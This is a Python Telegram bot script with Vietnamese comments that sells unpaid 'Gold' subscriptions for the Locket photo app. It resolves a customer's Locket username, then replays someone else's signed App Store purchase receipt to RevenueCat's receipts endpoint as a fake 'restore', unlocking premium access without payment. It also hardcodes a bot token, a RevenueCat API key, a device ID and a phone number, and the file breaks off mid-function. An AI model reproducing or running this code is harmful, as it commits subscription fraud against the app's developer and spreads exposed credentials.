#!/usr/bin/env python3
"""
VĂN DŨNG GOLD - Telegram Bot
Tự động kick Gold cho khách khi nhắn username
"""

import asyncio, aiohttp, json, re, os
from datetime import datetime, timezone
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ForceReply
from telegram.ext import (Application, CommandHandler, MessageHandler,
                           CallbackQueryHandler, filters, ContextTypes)

# ──────────────────────────────────────────
# CẤU HÌNH
# ──────────────────────────────────────────

BOT_TOKEN  = "8868803975:AAG5oLI2ow5xjr4JnkdE41NLof_CBChsVYk"
ADMIN_IDS  = [8374619289, 7662760183]
ZALO       = "0364594036"
SHOP_NAME  = "VĂN DŨNG GOLD"
DAILY_LIMIT = 5

# ── Custom emoji (tg-emoji) ──────────────
E_LOADING  = '<tg-emoji emoji-id="5350752364246606166">✍️</tg-emoji>'
E_LIMIT    = '<tg-emoji emoji-id="5424857974784925603">🚫</tg-emoji>'
E_SUCCESS  = '<tg-emoji emoji-id="5260463209562776385">✅</tg-emoji>'
E_ERROR    = '<tg-emoji emoji-id="5318840353510408444">🔴</tg-emoji>'
E_TIP      = '<tg-emoji emoji-id="4968003407315993509">💡</tg-emoji>'
E_MENU     = '<tg-emoji emoji-id="5449601904147440135">👑</tg-emoji>'
E_USER     = '<tg-emoji emoji-id="5974048815789903111">👤</tg-emoji>'
E_ID       = '<tg-emoji emoji-id="5974526806995242353">🆔</tg-emoji>'
E_TAG      = '<tg-emoji emoji-id="5240228673738527951">🏷️</tg-emoji>'
E_STAT     = '<tg-emoji emoji-id="4967519884192777037">📊</tg-emoji>'
E_SHIELD   = '<tg-emoji emoji-id="5352888345972187597">🛡️</tg-emoji>'
E_CALENDAR = '<tg-emoji emoji-id="5413879192267805083">📅</tg-emoji>'
E_IOS      = '<tg-emoji emoji-id="5350556204500263431">🍏</tg-emoji>'
E_ANDROID  = '<tg-emoji emoji-id="5303145396254563405">🤖</tg-emoji>'

# ──────────────────────────────────────────
# TOKEN REVENUECAT
# ──────────────────────────────────────────

TOKEN_CONFIG = {
    "fetch_token": "eyJhbGciOiJFUzI1NiIsIng1YyI6WyJNSUlFTVRDQ0E3YWdBd0lCQWdJUVI4S0h6ZG41NTRaL1VvcmFkTng5dHpBS0JnZ3Foa2pPUFFRREF6QjFNVVF3UWdZRFZRUURERHRCY0hCc1pTQlhiM0pzWkhkcFpHVWdSR1YyWld4dmNHVnlJRkpsYkdGMGFXOXVjeUJEWlhKMGFXWnBZMkYwYVc5dUlFRjFkR2h2Y21sMGVURUxNQWtHQTFVRUN3d0NSell4RXpBUkJnTlZCQW9NQ2tGd2NHeGxJRWx1WXk0eEN6QUpCZ05WQkFZVEFsVlRNQjRYRFRJMU1Ea3hPVEU1TkRRMU1Wb1hEVEkzTVRBeE16RTNORGN5TTFvd2daSXhRREErQmdOVkJBTU1OMUJ5YjJRZ1JVTkRJRTFoWXlCQmNIQWdVM1J2Y21VZ1lXNWtJR2xVZFc1bGN5QlRkRzl5WlNCU1pXTmxhWEIwSUZOcFoyNXBibWN4TERBcUJnTlZCQXNNSTBGd2NHeGxJRmR2Y214a2QybGtaU0JFWlhabGJHOXdaWElnVW1Wc1lYUnBiMjV6TVJNd0VRWURWUVFLREFwQmNIQnNaU0JKYm1NdU1Rc3dDUVlEVlFRR0V3SlZVekJaTUJNR0J5cUdTTTQ5QWdFR0NDcUdTTTQ5QXdFSEEwSUFCTm5WdmhjdjdpVCs3RXg1dEJNQmdyUXNwSHpJc1hSaTBZeGZlazdsdjh3RW1qL2JIaVd0TndKcWMyQm9IenNRaUVqUDdLRklJS2c0WTh5MC9ueW51QW1qZ2dJSU1JSUNCREFNQmdOVkhSTUJBZjhFQWpBQU1COEdBMVVkSXdRWU1CYUFGRDh2bENOUjAxREptaWc5N2JCODVjK2xrR0taTUhBR0NDc0dBUVVGQndFQkJHUXdZakF0QmdnckJnRUZCUWN3QW9ZaGFIUjBjRG92TDJObGNuUnpMbUZ3Y0d4bExtTnZiUzkzZDJSeVp6WXVaR1Z5TURFR0NDc0dBUVVGQnpBQmhpVm9kSFJ3T2k4dmIyTnpjQzVoY0hCc1pTNWpiMjB2YjJOemNEQXpMWGQzWkhKbk5qQXlNSUlCSGdZRFZSMGdCSUlCRlRDQ0FSRXdnZ0VOQmdvcWhraUc5Mk5rQlFZQk1JSCtNSUhEQmdnckJnRUZCUWNDQWpDQnRneUJzMUpsYkdsaGJtTmxJRzl1SUhSb2FYTWdZMlZ5ZEdsbWFXTmhkR1VnWW5rZ1lXNTVJSEJoY25SNUlHRnpjM1Z0WlhNZ1lXTmpaWEIwWVc1alpTQnZaaUIwYUdVZ2RHaGxiaUJoY0hCc2FXTmhZbXhsSUhOMFlXNWtZWEprSUhSbGNtMXpJR0Z1WkNCamIyNWthWFJwYjI1eklHOW1JSFZ6WlN3Z1kyVnlkR2xtYVdOaGRHVWdjRzlzYVdONUlHRnVaQ0JqWlhKMGFXWnBZMkYwYVc5dUlIQnlZV04wYVdObElITjBZWFJsYldWdWRITXVNRFlHQ0NzR0FRVUZCd0lCRmlwb2RIUndPaTh2ZDNkM0xtRndjR3hsTG1OdmJTOWpaWEowYVdacFkyRjBaV0YxZEdodmNtbDBlUzh3SFFZRFZSME9CQllFRklGaW9HNHdNTVZBMWt1OXpKbUdOUEFWbjNlcU1BNEdBMVVkRHdFQi93UUVBd0lIZ0RBUUJnb3Foa2lHOTJOa0Jnc0JCQUlGQURBS0JnZ3Foa2pPUFFRREF3TnBBREJtQWpFQStxWG5SRUM3aFhJV1ZMc0x4em5qUnBJelBmN1ZIejlWL0NUbTgrTEpsclFlcG5tY1B2R0xOY1g2WFBubGNnTEFBakVBNUlqTlpLZ2c1cFE3OWtuRjRJYlRYZEt2OHZ1dElETVhEbWpQVlQzZEd2RnRzR1J3WE95d1Iya1pDZFNyZmVvdCIsIk1JSURGakNDQXB5Z0F3SUJBZ0lVSXNHaFJ3cDBjMm52VDRZU3ljYWZQVGp6Yk5jd0NnWUlLb1pJemowRUF3TXdaekViTUJrR0ExVUVBd3dTUVhCd2JHVWdVbTl2ZENCRFFTQXRJRWN6TVNZd0pBWURWUVFMREIxQmNIQnNaU0JEWlhKMGFXWnBZMkYwYVc5dUlFRjFkR2h2Y21sMGVURVRNQkVHQTFVRUNnd0tRWEJ3YkdVZ1NXNWpMakVMTUFrR0ExVUVCaE1DVlZNd0hoY05NakV3TXpFM01qQXpOekV3V2hjTk16WXdNekU1TURBd01EQXdXakIxTVVRd1FnWURWUVFERER0QmNIQnNaU0JYYjNKc1pIZHBaR1VnUkdWMlpXeHZjR1Z5SUZKbGJHRjBhVzl1Y3lCRFpYSjBhV1pwWTJGMGFXOXVJRUYxZEdodmNtbDBlVEVMTUFrR0ExVUVDd3dDUnpZeEV6QVJCZ05WQkFvTUNrRndjR3hsSUVsdVl5NHhDekFKQmdOVkJBWVRBbFZUTUhZd0VBWUhLb1pJemowQ0FRWUZLNEVFQUNJRFlnQUVic1FLQzk0UHJsV21aWG5YZ3R4emRWSkw4VDBTR1luZ0RSR3BuZ24zTjZQVDhKTUViN0ZEaTRiQm1QaENuWjMvc3E2UEYvY0djS1hXc0w1dk90ZVJoeUo0NXgzQVNQN2NPQithYW85MGZjcHhTdi9FWkZibmlBYk5nWkdoSWhwSW80SDZNSUgzTUJJR0ExVWRFd0VCL3dRSU1BWUJBZjhDQVFBd0h3WURWUjBqQkJnd0ZvQVV1N0Rlb1ZnemlKcWtpcG5ldnIzcnI5ckxKS3N3UmdZSUt3WUJCUVVIQVFFRU9qQTRNRFlHQ0NzR0FRVUZCekFCaGlwb2RIUndPaTh2YjJOemNDNWhjSEJzWlM1amIyMHZiMk56Y0RBekxXRndjR3hsY205dmRHTmhaek13TndZRFZSMGZCREF3TGpBc29DcWdLSVltYUhSMGNEb3ZMMk55YkM1aGNIQnNaUzVqYjIwdllYQndiR1Z5YjI5MFkyRm5NeTVqY213d0hRWURWUjBPQkJZRUZEOHZsQ05SMDFESm1pZzk3YkI4NWMrbGtHS1pNQTRHQTFVZER3RUIvd1FFQXdJQkJqQVFCZ29xaGtpRzkyTmtCZ0lCQkFJRkFEQUtCZ2dxaGtqT1BRUURBd05vQURCbEFqQkFYaFNxNUl5S29nTUNQdHc0OTBCYUI2NzdDYUVHSlh1ZlFCL0VxWkdkNkNTamlDdE9udU1UYlhWWG14eGN4ZmtDTVFEVFNQeGFyWlh2TnJreFUzVGtVTUkzM3l6dkZWVlJUNHd4V0pDOTk0T3NkY1o0K1JHTnNZRHlSNWdtZHIwbkRHZz0iLCJNSUlDUXpDQ0FjbWdBd0lCQWdJSUxjWDhpTkxGUzVVd0NnWUlLb1pJemowRUF3TXdaekViTUJrR0ExVUVBd3dTUVhCd2JHVWdVbTl2ZENCRFFTQXRJRWN6TVNZd0pBWURWUVFMREIxQmNIQnNaU0JEWlhKMGFXWnBZMkYwYVc5dUlFRjFkR2h2Y21sMGVURVRNQkVHQTFVRUNnd0tRWEJ3YkdVZ1NXNWpMakVMTUFrR0ExVUVCaE1DVlZNd0hoY05NVFF3TkRNd01UZ3hPVEEyV2hjTk16a3dORE13TVRneE9UQTJXakJuTVJzd0dRWURWUVFEREJKQmNIQnNaU0JTYjI5MElFTkJJQzBnUnpNeEpqQWtCZ05WQkFzTUhVRndjR3hsSUVObGNuUnBabWxqWVhScGIyNGdRWFYwYUc5eWFYUjVNUk13RVFZRFZRUUtEQXBCY0hCc1pTQkpibU11TVFzd0NRWURWUVFHRXdKVlV6QjJNQkFHQnlxR1NNNDlBZ0VHQlN1QkJBQWlBMklBQkpqcEx6MUFjcVR0a3lKeWdSTWMzUkNWOGNXalRuSGNGQmJaRHVXbUJTcDNaSHRmVGpqVHV4eEV0WC8xSDdZeVlsM0o2WVJiVHpCUEVWb0EvVmhZREtYMUR5eE5CMGNUZGRxWGw1ZHZNVnp0SzUxN0lEdll1VlRaWHBta09sRUtNYU5DTUVBd0hRWURWUjBPQkJZRUZMdXczcUZZTTRpYXBJcVozcjY5NjYvYXl5U3JNQThHQTFVZEV3RUIvd1FGTUFNQkFmOHdEZ1lEVlIwUEFRSC9CQVFEQWdFR01Bb0dDQ3FHU000OUJBTURBMmdBTUdVQ01RQ0Q2Y0hFRmw0YVhUUVkyZTN2OUd3T0FFWkx1Tit5UmhIRkQvM21lb3locG12T3dnUFVuUFdUeG5TNGF0K3FJeFVDTUcxbWloREsxQTNVVDgyTlF6NjBpbU9sTTI3amJkb1h0MlFmeUZNbStZaGlkRGtMRjF2TFVhZ002QmdENTZLeUtBPT0iXX0.eyJ0cmFuc2FjdGlvbklkIjoiNTQwMDAyNjk1MjcxNDQzIiwib3JpZ2luYWxUcmFuc2FjdGlvbklkIjoiNTQwMDAxODcwMTU4NDc0Iiwid2ViT3JkZXJMaW5lSXRlbUlkIjoiNTQwMDAwODc4Mjc2NjAzIiwiYnVuZGxlSWQiOiJjb20ubG9ja2V0LkxvY2tldCIsInByb2R1Y3RJZCI6ImxvY2tldF8xNjAwXzF5Iiwic3Vic2NyaXB0aW9uR3JvdXBJZGVudGlmaWVyIjoiMjE0MTk0NDciLCJwdXJjaGFzZURhdGUiOjE3ODY2OTcyMzcwMDAsIm9yaWdpbmFsUHVyY2hhc2VEYXRlIjoxNzQwNDk1MjU5MDAwLCJleHBpcmVzRGF0ZSI6MTgxODIzMzIzNzAwMCwicXVhbnRpdHkiOjEsInR5cGUiOiJBdXRvLVJlbmV3YWJsZSBTdWJzY3JpcHRpb24iLCJkZXZpY2VWZXJpZmljYXRpb24iOiJTY2lCV1ZBMVozc1ovWGNKMk1TOExYNG9BUEg2dlB4TnhPcjBqZ3RpalNQckNWbEpFb2dqOVFxdlpWKzh6U3M4IiwiZGV2aWNlVmVyaWZpY2F0aW9uTm9uY2UiOiJhYzhhYzM5MC1iNDVhLTQzZjQtYjIzMS1iYjBjYzUxZDcyOWIiLCJpbkFwcE93bmVyc2hpcFR5cGUiOiJQVVJDSEFTRUQiLCJzaWduZWREYXRlIjoxNzg2Njk3MjQ4NzgxLCJlbnZpcm9ubWVudCI6IlByb2R1Y3Rpb24iLCJ0cmFuc2FjdGlvblJlYXNvbiI6IlBVUkNIQVNFIiwic3RvcmVmcm9udCI6IlZOTSIsInN0b3JlZnJvbnRJZCI6IjE0MzQ3MSIsInByaWNlIjozOTkwMDAwMDAsImN1cnJlbmN5IjoiVk5EIiwiYXBwVHJhbnNhY3Rpb25JZCI6IjcwNDI3MjE5OTMxNTM1ODU2OSIsImJpbGxpbmdQbGFuVHlwZSI6IkJJTExFRF9VUEZST05UIn0.Lw9Q-8THicVoT18rzH58JmMBTyjaPF3Dno6LkGCrGFu2i2d5jwCtsoGteFAltz5XDPvhDEjwZtJy92kqvF75gQ",
    "app_transaction": "eyJhbGciOiJFUzI1NiIsIng1YyI6WyJNSUlFTVRDQ0E3YWdBd0lCQWdJUVI0S0h6ZG41NTRaL1VvcmFkTng5dHpBS0JnZ3Foa2pPUFFRREF6QjFNVVF3UWdZRFZRUURERHRCY0hCc1pTQlhiM0pzWkhkcFpHVWdSR1YyWld4dmNHVnlJRkpsYkdGMGFXOXVjeUJEWlhKMGFXWnBZMkYwYVc5dUlFRjFkR2h2Y21sMGVURUxNQWtHQTFVRUN3d0NSell4RXpBUkJnTlZCQW9NQ2tGd2NHeGxJRWx1WXk0eEN6QUpCZ05WQkFZVEFsVlRNQjRYRFRJMU1Ea3hPVEU1TkRRMU1Wb1hEVEkzTVRBeE16RTNORGN5TTFvd2daSXhRREErQmdOVkJBTU1OMUJ5YjJRZ1JVTkRJRTFoWXlCQmNIQWdVM1J2Y21VZ1lXNWtJR2xVZFc1bGN5QlRkRzl5WlNCU1pXTmxhWEIwSUZOcFoyNXBibWN4TERBcUJnTlZCQXNNSTBGd2NHeGxJRmR2Y214a2QybGtaU0JFWlhabGJHOXdaWElnVW1Wc1lYUnBiMjV6TVJNd0VRWURWUVFLREFwQmNIQnNaU0JKYm1NdU1Rc3dDUVlEVlFRR0V3SlZVekJaTUJNR0J5cUdTTTQ5QWdFR0NDcUdTTTQ5QXdFSEEwSUFCTm5WdmhjdjdpVCs3RXg1dEJNQmdyUXNwSHpJc1hSaTBZeGZlazdsdjh3RW1qL2JIaVd0TndKcWMyQm9IenNRaUVqUDdLRklJS2c0WTh5MC9ueW51QW1qZ2dJSU1JSUNCREFNQmdOVkhSTUJBZjhFQWpBQU1COEdBMVVkSXdRWU1CYUFGRDh2bENOUjAxREptaWc5N2JCODVjK2xrR0taTUhBR0NDc0dBUVVGQndFQkJHUXdZakF0QmdnckJnRUZCUWN3QW9ZaGFIUjBjRG92TDJObGNuUnpMbUZ3Y0d4bExtTnZiUzkzZDJSeVp6WXVaR1Z5TURFR0NDc0dBUVVGQnpBQmhpVm9kSFJ3T2k4dmIyTnpjQzVoY0hCc1pTNWpiMjB2YjJOemNEQXpMWGQzWkhKbk5qQXlNSUlCSGdZRFZSMGdCSUlCRlRDQ0FSRXdnZ0VOQmdvcWhraUc5Mk5rQlFZQk1JSCtNSUhEQmdnckJnRUZCUWNDQWpDQnRneUJzMUpsYkdsaGJtTmxJRzl1SUhSb2FYTWdZMlZ5ZEdsbWFXTmhkR1VnWW5rZ1lXNTVJSEJoY25SNUlHRnpjM1Z0WlhNZ1lXTmpaWEIwWVc1alpTQnZaaUIwYUdVZ2RHaGxiaUJoY0hCc2FXTmhZbXhsSUhOMFlXNWtZWEprSUhSbGNtMXpJR0Z1WkNCamIyNWthWFJwYjI1eklHOW1JSFZ6WlN3Z1kyVnlkR2xtYVdOaGRHVWdjRzlzYVdONUlHRnVaQ0JqWlhKMGFXWnBZMkYwYVc5dUlIQnlZV04wYVdObElITjBZWFJsYldWdWRITXVNRFlHQ0NzR0FRVUZCd0lCRmlwb2RIUndPaTh2ZDNkM0xtRndjR3hsTG1OdmJTOWpaWEowYVdacFkyRjBaV0YxZEdodmNtbDBlUzh3SFFZRFZSME9CQllFRklGaW9HNHdNTVZBMWt1OXpKbUdOUEFWbjNlcU1BNEdBMVVkRHdFQi93UUVBd0lIZ0RBUUJnb3Foa2lHOTJOa0Jnc0JCQUlGQURBS0JnZ3Foa2pPUFFRREF3TnBBREJtQWpFQStxWG5SRUM3aFhJV1ZMc0x4em5qUnBJelBmN1ZIejlWL0NUbTgrTEpsclFlcG5tY1B2R0xOY1g2WFBubGNnTEFBakVBNUlqTlpLZ2c1cFE3OWtuRjRJYlRYZEt2OHZ1dElETVhEbWpQVlQzZEd2RnRzR1J3WE95d1Iya1pDZFNyZmVvdCIsIk1JSURGakNDQXB5Z0F3SUJBZ0lVSXNHaFJ3cDBjMm52VDRZU3ljYWZQVGp6Yk5jd0NnWUlLb1pJemowRUF3TXdaekViTUJrR0ExVUVBd3dTUVhCd2JHVWdVbTl2ZENCRFFTQXRJRWN6TVNZd0pBWURWUVFMREIxQmNIQnNaU0JEWlhKMGFXWnBZMkYwYVc5dUlFRjFkR2h2Y21sMGVURVRNQkVHQTFVRUNnd0tRWEJ3YkdVZ1NXNWpMakVMTUFrR0ExVUVCaE1DVlZNd0hoY05NakV3TXpFM01qQXpOekV3V2hjTk16WXdNekU1TURBd01EQXdXakIxTVVRd1FnWURWUVFERER0QmNIQnNaU0JYYjNKc1pIZHBaR1VnUkdWMlpXeHZjR1Z5SUZKbGJHRjBhVzl1Y3lCRFpYSjBhV1pwWTJGMGFXOXVJRUYxZEdodmNtbDBlVEVMTUFrR0ExVUVDd3dDUnpZeEV6QVJCZ05WQkFvTUNrRndjR3hsSUVsdVl5NHhDekFKQmdOVkJBWVRBbFZUTUhZd0VBWUhLb1pJemowQ0FRWUZLNEVFQUNJRFlnQUVic1FLQzk0UHJsV21aWG5YZ3R4emRWSkw4VDBTR1luZ0RSR3BuZ24zTjZQVDhKTUViN0ZEaTRiQm1QaENuWjMvc3E2UEYvY0djS1hXc0w1dk90ZVJoeUo0NXgzQVNQN2NPQithYW85MGZjcHhTdi9FWkZibmlBYk5nWkdoSWhwSW80SDZNSUgzTUJJR0ExVWRFd0VCL3dRSU1BWUJBZjhDQVFBd0h3WURWUjBqQkJnd0ZvQVV1N0Rlb1ZnemlKcWtpcG5ldnIzcnI5ckxKS3N3UmdZSUt3WUJCUVVIQVFFRU9qQTRNRFlHQ0NzR0FRVUZCekFCaGlwb2RIUndPaTh2YjJOemNDNWhjSEJzWlM1amIyMHZiMk56Y0RBekxXRndjR3hsY205dmRHTmhaek13TndZRFZSMGZCREF3TGpBc29DcWdLSVltYUhSMGNEb3ZMMk55YkM1aGNIQnNaUzVqYjIwdllYQndiR1Z5YjI5MFkyRm5NeTVqY213d0hRWURWUjBPQkJZRUZEOHZsQ05SMDFESm1pZzk3YkI4NWMrbGtHS1pNQTRHQTFVZER3RUIvd1FFQXdJQkJqQVFCZ29xaGtpRzkyTmtCZ0lCQkFJRkFEQUtCZ2dxaGtqT1BRUURBd05vQURCbEFqQkFYaFNxNUl5S29nTUNQdHc0OTBCYUI2NzdDYUVHSlh1ZlFCL0VxWkdkNkNTamlDdE9udU1UYlhWWG14eGN4ZmtDTVFEVFNQeGFyWlh2TnJreFUzVGtVTUkzM3l6dkZWVlJUNHd4V0pDOTk0T3NkY1o0K1JHTnNZRHlSNWdtZHIwbkRHZz0iLCJNSUlDUXpDQ0FjbWdBd0lCQWdJSUxjWDhpTkxGUzVVd0NnWUlLb1pJemowRUF3TXdaekViTUJrR0ExVUVBd3dTUVhCd2JHVWdVbTl2ZENCRFFTQXRJRWN6TVNZd0pBWURWUVFMREIxQmNIQnNaU0JEWlhKMGFXWnBZMkYwYVc5dUlFRjFkR2h2Y21sMGVURVRNQkVHQTFVRUNnd0tRWEJ3YkdVZ1NXNWpMakVMTUFrR0ExVUVCaE1DVlZNd0hoY05NVFF3TkRNd01UZ3hPVEEyV2hjTk16a3dORE13TVRneE9UQTJXakJuTVJzd0dRWURWUVFEREJKQmNIQnNaU0JTYjI5MElFTkJJQzBnUnpNeEpqQWtCZ05WQkFzTUhVRndjR3hsSUVObGNuUnBabWxqWVhScGIyNGdRWFYwYUc5eWFYUjVNUk13RVFZRFZRUUtEQXBCY0hCc1pTQkpibU11TVFzd0NRWURWUVFHRXdKVlV6QjJNQkFHQnlxR1NNNDlBZ0VHQlN1QkJBQWlBMklBQkpqcEx6MUFjcVR0a3lKeWdSTWMzUkNWOGNXalRuSGNGQmJaRHVXbUJTcDNaSHRmVGpqVHV4eEV0WC8xSDdZeVlsM0o2WVJiVHpCUEVWb0EvVmhZREtYMUR5eE5CMGNUZGRxWGw1ZHZNVnp0SzUxN0lEdll1VlRaWHBta09sRUtNYU5DTUVBd0hRWURWUjBPQkJZRUZMdXczcUZZTTRpYXBJcVozcjY5NjYvYXl5U3JNQThHQTFVZEV3RUIvd1FGTUFNQkFmOHdEZ1lEVlIwUEFRSC9CQVFEQWdFR01Bb0dDQ3FHU000OUJBTURBMmdBTUdVQ01RQ0Q2Y0hFRmw0YVhUUVkyZTN2OUd3T0FFWkx1Tit5UmhIRkQvM21lb3locG12T3dnUFVuUFdUeG5TNGF0K3FJeFVDTUcxbWloREsxQTNVVDgyTlF6NjBpbU9sTTI3amJkb1h0MlFmeUZNbStZaGlkRGtMRjF2TFVhZ002QmdENTZLeUtBPT0iXX0.eyJyZWNlaXB0VHlwZSI6IlByb2R1Y3Rpb24iLCJhcHBBcHBsZUlkIjoxNjAwNTI1MDYxLCJidW5kbGVJZCI6ImNvbS5sb2NrZXQuTG9ja2V0IiwiYXBwbGljYXRpb25WZXJzaW9uIjoiMTA0NiIsInZlcnNpb25FeHRlcm5hbElkZW50aWZpZXIiOjg4OTQ2NzM1NywicmVjZWlwdENyZWF0aW9uRGF0ZSI6MTc4NjY4MzAyMjUxMSwicmVxdWVzdERhdGUiOjE3ODY2ODMwMjI1MTEsIm9yaWdpbmFsUHVyY2hhc2VEYXRlIjoxNzA4NjI1NjY5NTY0LCJvcmlnaW5hbEFwcGxpY2F0aW9uVmVyc2lvbiI6IjEiLCJkZXZpY2VWZXJpZmljYXRpb24iOiJXUUV1eEx3QWo4d1pVdkJkVFM3dnI4ZFFVOGFUZ205ZFI4Zzl6eUxSNTUrbUlkWWdhaHQvbmttb0VXdnBGb1RRIiwiZGV2aWNlVmVyaWZpY2F0aW9uTm9uY2UiOiI3OTQ3ZWRhMS1jMWVmLTQ4ZmItOWEyYS02MWI4YzBjM2YxOTciLCJvcmlnaW5hbFBsYXRmb3JtIjoiaU9TIiwiYXBwVHJhbnNhY3Rpb25JZCI6IjcwNDI3MjE5OTMxNTM1ODU2OSJ9.dD-eTadlrPvk-5Xj6iFlq2AD6prK9tmzG_zCkW_CIAKp46MJuvZDrblyIQXV3ahhMvGE7F_dZl7HPRBgkFcUkQ",
    "hash_params": "app_user_id,fetch_token,app_transaction:sha256:8b6cce125219e2c6a26689448234c8c03894cb72855b73e8598c58ed1056d8df",
    "hash_headers": "X-Is-Sandbox:sha256:fcbcf165908dd18a9e49f7ff27810176db8e9f63b4352213741664245224f8aa",
}

# ── Usage tracking ──────────────────────────────
usage_data = {}

def check_limit(user_id: int) -> tuple:
    if user_id in ADMIN_IDS:
        return True, 999
    today = datetime.now().strftime("%Y-%m-%d")
    if user_id not in usage_data or usage_data[user_id]["date"] != today:
        usage_data[user_id] = {"date": today, "count": 0}
    used = usage_data[user_id]["count"]
    remaining = DAILY_LIMIT - used
    return remaining > 0, remaining

def add_usage(user_id: int):
    if user_id in ADMIN_IDS:
        return
    today = datetime.now().strftime("%Y-%m-%d")
    if user_id not in usage_data or usage_data[user_id]["date"] != today:
        usage_data[user_id] = {"date": today, "count": 0}
    usage_data[user_id]["count"] += 1

def get_used(user_id: int) -> int:
    if user_id in ADMIN_IDS:
        return 0
    today = datetime.now().strftime("%Y-%m-%d")
    if user_id in usage_data and usage_data[user_id]["date"] == today:
        return usage_data[user_id]["count"]
    return 0

HEADERS = {
    'Host': 'api.revenuecat.com',
    'Authorization': 'Bearer appl_JngFETzdodyLmCREOlwTUtXdQik',
    'Content-Type': 'application/json',
    'Accept': '*/*',
    'X-Platform': 'iOS',
    'X-Platform-Version': 'Version 26.2 (Build 23C55)',
    'X-Platform-Device': 'iPhone15,3',
    'X-Platform-Flavor': 'native',
    'X-Version': '5.41.0',
    'X-Client-Version': '2.32.2',
    'X-Client-Bundle-ID': 'com.locket.Locket',
    'X-Client-Build-Version': '3',
    'X-StoreKit2-Enabled': 'true',
    'X-StoreKit-Version': '2',
    'X-Observer-Mode-Enabled': 'false',
    'X-Is-Sandbox': 'false',
    'X-Storefront': 'VNM',
    'X-Apple-Device-Identifier': '39A73C25-1E05-4350-ADA7-5CD3FE1079E8',
    'X-Preferred-Locales': 'vi_KR,ko_KR,en_KR',
    'X-Nonce': 'w0Mlb6+AmV4WYuVv',
    'X-Is-Backgrounded': 'false',
    'X-Retry-Count': '0',
    'X-Is-Debug-Build': 'false',
    'User-Agent': 'Locket/3 CFNetwork/3860.300.31 Darwin/25.2.0',
    'Accept-Language': 'vi-VN,vi;q=0.9',
    'Connection': 'keep-alive',
    'Pragma': 'no-cache',
    'Cache-Control': 'no-cache',
    'X-RevenueCat-ETag': ''
}


# ──────────────────────────────────────────
# REVENUECAT LOGIC
# ──────────────────────────────────────────

async def resolve_uid(username: str) -> str | None:
    username = username.strip().lstrip('@')
    for prefix in ['https://locket.cam/', 'http://locket.cam/', 'locket.cam/', 'www.locket.cam/']:
        if prefix in username:
            username = username.split(prefix)[-1].split('?')[0].strip('/')
            break
    if re.match(r'^[A-Za-z0-9]{28}$', username):
        return username
    url = f"https://locket.cam/{username}"
    headers = {"User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)", "Accept": "text/html"}
    def extract(text):
        if not text: return None
        import re as _re
        m = _re.search(r'/invites/([A-Za-z0-9]{28})', text)
        if m: return m.group(1)
        lp = _re.search(r'link=([^ "\'>]+)', text)
        if lp:
            try:
                d = lp.group(1).replace('%3A', ':').replace('%2F', '/')
                dm = _re.search(r'/invites/([A-Za-z0-9]{28})', d)
                if dm: return dm.group(1)
            except: pass
        return None
    try:
        async with aiohttp.ClientSession() as s:
            async with s.get(url, headers=headers, allow_redirects=True, timeout=aiohttp.ClientTimeout(total=10)) as r:
                html = await r.text()
                return extract(str(r.url)) or extract(html)
    except Exception:
        pass
    return None


async def check_gold(uid: str) -> dict:
    url = f"https://api.revenuecat.com/v1/subscribers/{uid}"
    hdrs = {
        "Authorization": "Bearer appl_JngFETzdodyLmCREOlwTUtXdQik",
        "Content-Type": "application/json",
        "X-Platform": "iOS",
        "X-Platform-Version": "Version 26.2 (Build 23C55)",
        "X-Client-Bundle-ID": "com.locket.Locket",
        "User-Agent": "Locket/3 CFNetwork/3860.300.31 Darwin/25.2.0",
        "X-Is-Sandbox": "false",
    }
    try:
        async with aiohttp.ClientSession() as s:
            async with s.get(url, headers=hdrs, timeout=aiohttp.ClientTimeout(total=10)) as r:
                if r.status != 200:
                    return {"has_gold": False, "expires_date": None, "product_id": None, "status": "Free"}
                data = await r.json()

        subscriber = data.get("subscriber", {})
        entitlements = subscriber.get("entitlements", {})
        subscriptions = subscriber.get("subscriptions", {})

        gold_keys = ["gold", "Gold", "premium", "locket_gold", "pro"]
        active_ent = None
        for k in gold_keys:
            if k in entitlements:
                active_ent = entitlements[k]
                break
        if not active_ent and entitlements:
            active_ent = next(iter(entitlements.values()))

        if active_ent:
            expires_raw = active_ent.get("expires_date")
            product_id  = active_ent.get("product_identifier")
            if expires_raw:
                try:
                    exp_dt = datetime.fromisoformat(expires_raw.replace("Z", "+00:00"))
                    exp_str = exp_dt.strftime("%d/%m/%Y")
                    if exp_dt > datetime.now(timezone.utc):
                        return {"has_gold": True, "expires_date": exp_str, "product_id": product_id,
                                "status": f"Active Gold (hết hạn {exp_str})"}
                    else:
                        return {"has_gold": False, "expires_date": exp_str, "product_id": product_id,
                                "status": f"Expired ({exp_str})"}
                except ValueError:
                    pass

        for prod, sub in subscriptions.items():
            expires_raw = sub.get("expires_date")
            if expires_raw:
                try:
                    exp_dt = datetime.fromisoformat(expires_raw.replace("Z", "+00:00"))
                    exp_str = exp_dt.strftime("%d/%m/%Y")
                    if exp_dt > datetime.now(timezone.utc):
                        return {"has_gold": True, "expires_date": exp_str, "product_id": prod,
                                "status": f"Active Gold (hết hạn {exp_str})"}
                except ValueError:
                    pass

        return {"has_gold": False, "expires_date": None, "product_id": None, "status": "Free"}

    except Exception as e:
        return {"has_gold": False, "expires_date": None, "product_id": None, "status": f"Free (lỗi: {e})"}


async def inject_gold(uid: str) -> tuple[bool, str]:
    import time as _time
    url = "https://api.revenuecat.com/v1/receipts"
    body = {
        "product_id": "locket_199_1m",
        "fetch_token": TOKEN_CONFIG["fetch_token"],
        "app_transaction": TOKEN_CONFIG["app_transaction"],
        "app_user_id": uid,
        "is_restore": True,
        "store_country": "VNM",
        "currency": "USD",
        "price": "1.99",
        "normal_duration": "P1M",
        "subscription_group_id": "21419447",
        "observer_mode": False,
        "initiation_source": "restore",
        "offers": [],
        "attributes": {
            "$attConsentStatus": {"updated_at_ms": int(_time.time() * 1000), "value": "notDetermined"}
        }
    }
    hdrs = HEADERS.copy()
    hdrs['Content-Length'] = str(len(json.dumps(body)))
    if TOKEN_CONFIG.get("hash_params"):
        hdrs['X-Post-Params-Hash'] = TOKEN_CONFIG["hash_params"]
    if TOKEN_CONFIG.get("hash_headers"):
        hdrs['X-Headers-Hash'] = TOKEN_CONFIG["hash_headers"]
    hdrs['X-Is-Sandbox'] = 'false'

    async with aiohttp.ClientSession() as s:
        async with s.post(url, headers=hdrs, json=body, timeout=aiohttp.ClientTimeout(total=15)) as r:
            data = await r.json()
            if r.status in (200, 201):
                return True, "ok"
            else:
                err = data.get("message", str(r.status))
